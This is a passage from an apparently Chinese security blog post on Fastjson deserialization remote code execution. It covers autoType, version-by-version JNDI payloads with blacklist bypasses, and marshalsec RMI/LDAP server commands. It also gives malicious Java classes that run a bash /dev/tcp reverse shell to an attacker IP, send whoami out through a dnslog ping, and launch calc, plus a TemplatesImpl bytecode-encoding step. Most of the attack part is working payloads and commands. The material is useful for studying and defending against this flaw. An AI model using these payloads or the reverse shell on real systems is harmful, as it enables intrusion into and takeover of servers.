8u191更新中，Oracle对LDAP向量设置了相同的限制，并发布了CVE-2018-3149，关闭了JNDI远程类加载。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/20220818095056.png" alt="img"></p><ul><li>所以，ldap的利用范围比rmi广，实战情况下推荐使用ldap方法。</li></ul><h2 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h2><p>Fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，可以将数据在JSON和Java Object之间互相转换。</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>FastJson自己实现了一套反序列化的机制，并没有使用默认的readObject()，在序列化反序列化的时候会进行一些操作，主要是setter和getter的操作，同样结合一些类的特性造成命令执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Apple</span> <span class="keyword">implements</span> <span class="title">Fruit</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Big_Decimal price;</span><br><span class="line">    <span class="comment">//省略 setter/getter、toString等</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Banana</span> <span class="keyword">implements</span> <span class="title">Fruit</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Big_Decimal price;</span><br><span class="line">    <span class="comment">//省略 setter/getter、toString等</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>toJSONString : 将对象<code>序列化</code>为字符串</p></li><li><p>parseObject ： 将字符串<code>反序列化</code>为对象</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">toJSONString : &#123;&quot;fruit&quot;:&#123;&quot;price&quot;:0.5&#125;&#125;</span><br><span class="line">toJSONString : &#123;&quot;fruit&quot;:&#123;&quot;price&quot;:500&#125;&#125;</span><br></pre></td></tr></table></figure><p>为了解决上述问题，引用了autotype,即在序列化的时候，把原始类型记录下来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;fruit&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.hollis.lab.fastjson.test.Apple&quot;,</span><br><span class="line">        &quot;price&quot;:0.5</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fastjson在解析json的过程中，支持使用<code>autoType</code>来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p><p>那么就可以利用这个特性，自己构造一个JSON字符串，并且使用@type指定一个自己想要使用的攻击类库。</p><p>比如<code>com.sun.rowset.JdbcRowSetImpl</code>这个类库，是sun官方提供的一个类库，这个类的<code>dataSourceName</code>支持传入一个rmi的源，当解析这个uri的时候，就会支持rmi远程调用，去指定的rmi地址中去调用方法。</p><p>攻击者准备rmi服务（主机C）和web服务（主机B），构造json数据将rmi绝对路径注入到lookup方法中，受害者（主机A）的JNDI接口会指向攻击者控制RMI服务器（主机C），JNDI接口向攻击者控制web服务器远程加载恶意代码，执行构造函数形成RCE</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">    <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://C_ip:9999/evilclass&quot;</span>,</span><br><span class="line">    <span class="string">&quot;autoCommit&quot;</span>: <span class="keyword">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/20220818095105.png" alt="image-20211103213421122"></p><ul><li><p>主机A引发反序列化漏洞，进行rmi远程方法调用，去连接主机C的9999端口。</p></li><li><p>主机C的rmi服务指定加载主机B的恶意java类，所以主机A通过主机C的rmi服务最终加载并执行主机B的恶意java类。</p></li><li><p>主机A执行恶意Java类，主机B获得反弹shell，控制主机A。</p></li></ul><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><h3 id="Fastjson-lt-1-2-24"><a href="#Fastjson-lt-1-2-24" class="headerlink" title="Fastjson&lt;=1.2.24"></a>Fastjson&lt;=1.2.24</h3><p>最早期的fastjson版本中，AutoType是默认开启的，并且没有什么限制，可以直接加载恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://C_ip:9999/Exploit&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="keyword">true</span>&#125; </span><br></pre></td></tr></table></figure><h3 id="Fastjson-lt-1-2-41"><a href="#Fastjson-lt-1-2-41" class="headerlink" title="Fastjson&lt;=1.2.41"></a>Fastjson&lt;=1.2.41</h3><p>设置了autoTypeSupport属性默认为false，并且增加了checkAutoType()函数，通过黑白名单的方式来防御Fastjson反序列化漏洞</p><p>在此期间，发现了在具体加载类的时候会判断类名是否以”L”开头、以”;”结尾，是的话就提取出其中的类名再加载进来，因此在原类名头部加L，尾部加;即可绕过黑名单的同时加载类。</p><p>基于黑名单绕过，autoTypeSupport属性为true才能使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://C_ip:9999/Exploit&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="keyword">true</span>&#125; </span><br></pre></td></tr></table></figure><h3 id="Fastjson-lt-1-2-42"><a href="#Fastjson-lt-1-2-42" class="headerlink" title="Fastjson&lt;=1.2.42"></a>Fastjson&lt;=1.2.42</h3><p>新加入了检测机制，fastjson先判断目标类的类名的前后是不是L和;，如果是的话，就截取掉前后的L和;再进行黑白名单的校验。</p><p>绕过方式改为了双写绕过  <code>LL和;;</code></p><p>基于黑名单绕过，autoTypeSupport属性为true才能使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://C_ip:9999/Exploit&quot;</span>, <span class="string">&quot;autoCommit&quot;</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="Fastjson-lt-1-2-43"><a href="#Fastjson-lt-1-2-43" class="headerlink" title="Fastjson&lt;=1.2.43"></a>Fastjson&lt;=1.2.43</h3><p>检测是否以LL开头，短暂的修复了漏洞</p><p>绕过：根据fastjson判断函数，[开头则提取类名，且后面字符字符为”[“、”{“等，即可正常调用</p><p>基于黑名单绕过，autoTypeSupport属性为true才能使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://C_ip:9999/Exploit&quot;</span>, <span class="string">&quot;autoCommit&quot;</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="Fastjson-lt-1-2-45"><a href="#Fastjson-lt-1-2-45" class="headerlink" title="Fastjson&lt;=1.2.45"></a>Fastjson&lt;=1.2.45</h3><p>1.2.44时增加限制：只要类以[开头或者以;结尾，直接抛异常</p><p>基于黑名单绕过，autoTypeSupport属性为true才能使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,<span class="string">&quot;properties&quot;</span>:&#123;<span class="string">&quot;data_source&quot;</span>:<span class="string">&quot;ldap://C_ip:9999/Exploit&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>以上的这些利用方式都是只有在autoTypeSupport属性为true才能使用，fastjson&gt;=1.2.25默认为false</p></blockquote><h3 id="Fastjson-lt-1-2-47"><a href="#Fastjson-lt-1-2-47" class="headerlink" title="Fastjson&lt;=1.2.47"></a>Fastjson&lt;=1.2.47</h3><p>版本小于1.2.48的版本通杀，在autoType为false时生效，loadClass中默认cache设置为true，在类加载的时候，如果autotype没开启，会先尝试从缓存中获取类，如果缓存中有，则直接返回。 </p><p>首先使用java.lang.Class把获取到的类缓存到mapping中，然后直接从缓存中获取到了com.sun.rowset.JdbcRowSetImpl这个类，绕过了黑名单机制</p><p>autoTypeSupport属性为false才能使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>, </span><br><span class="line">        <span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;, </span><br><span class="line">    <span class="string">&quot;b&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>, </span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>: <span class="string">&quot;rmi://C_ip:9999/jndi&quot;</span>, </span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>: <span class="keyword">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Fastjson-lt-1-2-62"><a href="#Fastjson-lt-1-2-62" class="headerlink" title="Fastjson&lt;=1.2.62"></a>Fastjson&lt;=1.2.62</h3><p>在1.2.48版本中，设置了fastjson cache为false</p><p>基于黑名单绕过，autoTypeSupport属性为true才能使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,<span class="string">&quot;AsText&quot;</span>:<span class="string">&quot;rmi://C_ip:9999/exploit&quot;</span>&#125;<span class="string">&quot;;</span></span><br></pre></td></tr></table></figure><h3 id="Fastjson-lt-1-2-66"><a href="#Fastjson-lt-1-2-66" class="headerlink" title="Fastjson&lt;=1.2.66"></a>Fastjson&lt;=1.2.66</h3><p>基于黑名单绕过，autoTypeSupport属性为true才能使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,<span class="string">&quot;resourceName&quot;</span>:<span class="string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="string">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span>,<span class="string">&quot;jndiNames&quot;</span>:<span class="string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span>,<span class="string">&quot;properties&quot;</span>: &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.util.Properties&quot;</span>,<span class="string">&quot;UserTransaction&quot;</span>:<span class="string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="Fastjson-1-2-24-利用过程"><a href="#Fastjson-1-2-24-利用过程" class="headerlink" title="Fastjson 1.2.24 利用过程"></a>Fastjson 1.2.24 利用过程</h2><p>先通过dnslog检测漏洞是否存在</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/20220818095112.png" alt="image-20211103153630126"></p><p>执行成功</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/20220818095116.png" alt="image-20211103154208155"></p><h3 id="RMI攻击方式"><a href="#RMI攻击方式" class="headerlink" title="RMI攻击方式"></a>RMI攻击方式</h3><blockquote><p>先将恶意类放到指定的http服务下，再开启RMI服务器加载恶意类，在payload中也要指向RMI服务器的地址</p></blockquote><p>恶意类代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">dnslog</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;ping user.`whoami`.n9xpa1.dnslog.cn&quot;</span>;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/20220818095121.png" alt="image-20211103153845745"></p><p>使用marshalsec工具快捷的开启RMI服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http:&#x2F;&#x2F;192.168.50.123:8000&#x2F;#dnslog&quot; 9999</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/20220818095119.png" alt="image-20211103154918065"></p><p>请求192.168.50.123上的dnslog.class文件</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/20220818095126.png" alt="image-20211103155301266"></p><p>验证是否成功</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/20220818095130.png" alt="image-20211104145938361"></p><p>若要获取shell，只要将执行的命令改为反弹shell的命令即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Shell</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Shell</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Process p = Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/192.168.50.123/1234;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;);</span><br><span class="line">        InputStream is = p.getInputStream();</span><br><span class="line">        BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is));</span><br><span class="line"> </span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = reader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.50.123:8000/#Shell&quot; 9999</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/20220818095136.png" alt="image-20211103160707233"></p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/20220818095138.png" alt="image-20211103161012519"></p><p>成功获取</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/20220818095141.png" alt="image-20211103160516312"></p><h3 id="LDAP攻击方式"><a href="#LDAP攻击方式" class="headerlink" title="LDAP攻击方式"></a>LDAP攻击方式</h3><p>和RMI利用方式相似，只需要更改一下服务类型为ldap</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span>.<span class="number">3</span>-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://192.168.50.123:8000/#Shell&quot;</span> <span class="number">9999</span></span><br></pre></td></tr></table></figure><p>payload如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;ldap://192.168.50.177:9999/Shell&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样执行成功</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/20220818095144.png" alt="image-20211103163245166"></p><h2 id="Fastjson-1-2-47-利用过程"><a href="#Fastjson-1-2-47-利用过程" class="headerlink" title="Fastjson 1.2.47 利用过程"></a>Fastjson 1.2.47 利用过程</h2><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/20220818095146.png" alt="image-20211104150556012"></p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/20220818095150.png" alt="image-20211104102020973"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://192.168.50.123:8000/#evilclass&quot; 9999</span><br></pre></td></tr></table></figure><p>evilclass 执行命令 calc.exe</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">evilclass</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">evilclass</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">    evilclass c = <span class="keyword">new</span> evilclass();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;name&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,<span class="string">&quot;x&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://192.168.50.177:9999/evilclass&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="keyword">true</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/20220818095156.png" alt="image-20211104102835542"></p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/20220818095207.png" alt="image-20211104102846076"></p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/20220818095212.png" alt="image-20211104102724022"></p><p>成功弹出了计算器</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/20220818095214.png" alt="image-20211104102602830"></p><h2 id="服务器不出网情况利用"><a href="#服务器不出网情况利用" class="headerlink" title="服务器不出网情况利用"></a>服务器不出网情况利用</h2><p>如果遇到无法出网的机器，这时候无法通过 JNDI 注入来进行反弹等操作。直接<code>本地反序列化</code>利用</p><p><strong>限制条件</strong>：</p><ul><li><code>BasicDataSource</code>(tomcat-dbcp:7.x, tomcat-dbcp:9.x, commons-dbcp:1.4)</li><li><code>TemplatesImpl</code> 需要解析的时候设置 Feature.SupportNonPublicField</li></ul><h3 id="TemplatesImpl的利用"><a href="#TemplatesImpl的利用" class="headerlink" title="TemplatesImpl的利用"></a>TemplatesImpl的利用</h3><blockquote><p>TemplatesImpl类，有一个字段是 _bytecodes，有部分函数会根据这个_bytecodes生成java实例，这就达到fastjson通过字段传入一个类，再通过这个类被生成时执行构造函数。</p></blockquote><p>但是这种利用方式需要一个特定的触发条件，解析JSON的时候需要使用Feature才能触发，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JSONObject.parseObject(sb.toString(), <span class="keyword">new</span> Feature[]&#123;Feature.SupportNonPublicField&#125;);</span><br></pre></td></tr></table></figure><p>由于这个前提的存在，基本不太可能能在实战环境成功遇到。</p><p><code>恶意类代码</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Calc</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Calc</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;        </span><br><span class="line">        Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;calc&quot;</span>&#125;);    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="meta">@Override</span>    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> </span>&#123;</span><br><span class="line">        &#125;    </span><br><span class="line">    <span class="meta">@Override</span>    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] haFndlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;    &#125;    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;        </span><br><span class="line">        Calc t = <span class="keyword">new</span> Calc();    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对class类文件进行base64编码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">fin = <span class="built_in">open</span>(<span class="string">r&quot;Calc.class&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">fout = <span class="built_in">open</span>(<span class="string">r&quot;en.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">s = base64.encodestring(fin.read()).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">fout.write(s)</span><br><span class="line">fin.close()</span><br><span class="line">fout.close()</span><br></pre></td></tr></table></figure><p>修改 <code>json</code> 的 <code>_bytecodes</code> 为 刚刚生成的 <code>base64</code> 文本 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;    </span><br><span class="line"><span class="string">&quot;a&quot;</span>: &#123;        </span><br><span class="line"><span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,        </span><br><span class="line"><span class="string">&quot;val&quot;</span>: <span 